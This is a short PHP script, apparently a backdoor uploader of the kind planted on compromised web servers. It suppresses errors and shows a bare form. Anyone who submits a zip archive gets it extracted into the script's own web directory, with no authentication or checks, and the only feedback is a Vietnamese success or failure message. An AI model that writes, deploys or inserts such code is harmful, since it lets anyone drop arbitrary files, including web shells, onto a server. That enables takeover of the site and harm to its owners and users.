<?php

error_reporting(0);

if (isset($_POST['s'])) {
$z = new ZipArchive();
if ($z->open($_FILES['file']['tmp_name']) === TRUE) {
$z->extractTo('.');
echo 'Thanh cong<br/>';
} else {
echo 'That bai<br/>';
}
}

echo '<form action="?" method="post" enctype="multipart/form-data">
<input name="file" type="file"/><br/>
<input name="s" type="submit"/>
</form>';
?>